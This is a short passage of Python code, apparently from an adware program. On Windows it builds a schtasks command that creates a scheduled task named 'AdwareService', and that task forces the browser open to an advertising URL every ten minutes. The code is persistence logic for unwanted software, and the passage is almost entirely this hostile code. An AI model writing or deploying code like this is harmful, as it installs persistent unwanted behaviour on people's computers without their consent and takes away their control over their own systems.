        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw -c import webbrowser; webbrowser.open(\'{ad_url}\')" /sc minute /mo 10'
